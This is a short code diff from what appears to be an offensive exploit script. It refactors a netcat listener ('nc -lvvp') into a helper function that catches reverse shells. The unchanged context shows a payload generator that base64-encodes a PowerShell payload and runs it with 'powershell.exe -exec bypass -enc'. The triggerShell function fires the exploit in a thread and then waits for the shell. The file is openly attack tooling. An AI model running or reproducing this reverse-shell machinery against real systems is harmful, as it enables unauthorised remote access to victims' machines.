@@ -36,13 +36,16 @@ def generatePayload(type, local_address, port):
         payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
         return f"powershell.exe -exec bypass -enc {payload_encoded}"
 
+def spawn_listener(port):
+    pty.spawn(["nc", "-lvvp", str(port)])
+
 def triggerShell(func, port):
     def _wait_and_exec():
         time.sleep(1.5)
         func()
 
     threading.Thread(target=_wait_and_exec).start()
-    pty.spawn(["nc", "-lvvp", str(port)])
+    spawn_listener(port)
 
 
 if __name__ == "__main__":
